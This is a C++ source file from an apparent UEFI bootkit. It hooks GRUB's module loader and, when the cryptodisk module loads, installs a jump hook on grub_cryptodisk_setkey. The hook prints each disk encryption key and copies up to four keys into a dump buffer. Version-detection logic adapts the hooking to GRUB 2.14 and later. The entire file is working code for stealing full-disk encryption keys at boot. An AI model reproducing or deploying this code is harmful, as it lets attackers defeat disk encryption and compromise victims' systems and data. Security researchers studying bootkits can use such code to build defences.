#include <bootkit/binary/elf.hpp>
#include <bootkit/debug.hpp>
#include <bootkit/hooking/jmp_hooking.hpp>
#include <bootkit/hooks/grub.hpp>

extern "C" {
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
}

grub_dl_t hooks::grub::grub_dl_load_core_noinit(void *addr, uintptr_t size)
{
  static bool version_inferred = false;
  static bool is_grub_2_14 = false;
  grub_dl_t res;
  grub_dl_t_2_14 res_2_14;
  uintptr_t setkey_rva;

  setkey_rva = elf::get_export(addr, "grub_cryptodisk_setkey");

  // unhook, call, hook again
  jmp_unhook(&grub_dl_load_core_noinit_ctx);
  res = reinterpret_cast<decltype(&grub_dl_load_core_noinit)>(grub_dl_load_core_noinit_ctx.from)(
      addr, size);
  res_2_14 = reinterpret_cast<grub_dl_t_2_14>(res);
  jmp_hook(grub_dl_load_core_noinit_ctx.from, reinterpret_cast<uintptr_t>(grub_dl_load_core_noinit),
           &grub_dl_load_core_noinit_ctx);

  if (!version_inferred) {
    const uintptr_t _addr = reinterpret_cast<uintptr_t>(addr);
    const uintptr_t _base = reinterpret_cast<uintptr_t>(res->base);
    const uintptr_t _base_2_14 = reinterpret_cast<uintptr_t>(res_2_14->base);

    uintptr_t diff1 = _addr > _base ? _addr - _base : _base - _addr;
    uintptr_t diff2 = _addr > _base_2_14 ? _addr - _base_2_14 : _base_2_14 - _addr;

    if (diff1 > diff2) {
      dbg::print(DEBUG_INFO, "Structure footprinting detected this is grub 2.14+\r\n", addr, size);
      is_grub_2_14 = true;
    }

    version_inferred = true;
  }

  // everything starting from ref_count changes position
  if (is_grub_2_14) {
    res->ref_count = static_cast<int>(res_2_14->ref_count); // int <- uint64_t
    res->persistent = res_2_14->persistent;
    res->dep = res_2_14->dep;
    res->segment = res_2_14->segment;
    res->symtab = res_2_14->symtab;
    res->symsize = res_2_14->symsize;
    res->init = res_2_14->init;
    res->fini = res_2_14->fini;
    res->base = res_2_14->base;
    res->sz = res_2_14->sz;
    // not used
    // res->next = reinterpret_cast<grub_dl_t>(compat->next);
  }

  if (AsciiStrStr("cryptodisk", res->name)) {
    uintptr_t grub_cryptodisk_setkey_addr;
    dbg::print(DEBUG_INFO, "Grub is loading cryptodisk. Attempting to tamper it...\r\n");
    if (setkey_rva == 0) {
      dbg::print(DEBUG_ERROR, "Failed to find grub_cryptodisk_setkey RVA\r\n");
      if (is_grub_2_14)
        return res;
      else
        return reinterpret_cast<grub_dl_t>(res_2_14);
    }

    grub_cryptodisk_setkey_addr = reinterpret_cast<uintptr_t>(res->base) + setkey_rva;
    dbg::print(DEBUG_INFO, "Found grub_cryptodisk_setkey at %p\r\n",
               reinterpret_cast<void *>(grub_cryptodisk_setkey_addr));
    dbg::print(DEBUG_INFO, "Hooking grub_cryptodisk_setkey...\r\n");
    if (!jmp_hook(grub_cryptodisk_setkey_addr,
                  reinterpret_cast<uintptr_t>(grub_cryptodisk_setkey_hook),
                  &grub_cryptodisk_setkey_ctx)) {
      dbg::print(DEBUG_ERROR, "Failed to hook grub_cryptodisk_setkey\r\n");
    }
  }

  if (is_grub_2_14)
    return res;
  else
    return reinterpret_cast<grub_dl_t>(res_2_14);
}

gcry_err_code_t hooks::grub::grub_cryptodisk_setkey_hook(void *dev, uint8_t *key, uintptr_t keysize)
{
  gcry_err_code_t res;

  if (key != nullptr && keysize != 0) {
    dbg::print(DEBUG_INFO, "cryptodisk key found: ", dev, key, keysize);
    for (uintptr_t i = 0; i < keysize; i++) {
      dbg::print(DEBUG_INFO, "%02x", key[i]);
    }
    dbg::print(DEBUG_INFO, "\n");

    if (grubx64::dumped_keys_index < 4) {
      CopyMem(grubx64::dumped_keys[grubx64::dumped_keys_index], key, keysize);
      grubx64::dumped_keys_len[grubx64::dumped_keys_index] = keysize;
      grubx64::dumped_keys_index++;
    }
  }
  else {
    dbg::print(DEBUG_ERROR, "Key or keysize was invalid\n");
  }

  jmp_unhook(&grub_cryptodisk_setkey_ctx);
  res = reinterpret_cast<decltype(&grub_cryptodisk_setkey_hook)>(grub_cryptodisk_setkey_ctx.from)(
      dev, key, keysize);
  jmp_hook(grub_cryptodisk_setkey_ctx.from,
           reinterpret_cast<uintptr_t>(grub_cryptodisk_setkey_hook), &grub_cryptodisk_setkey_ctx);

  return res;
}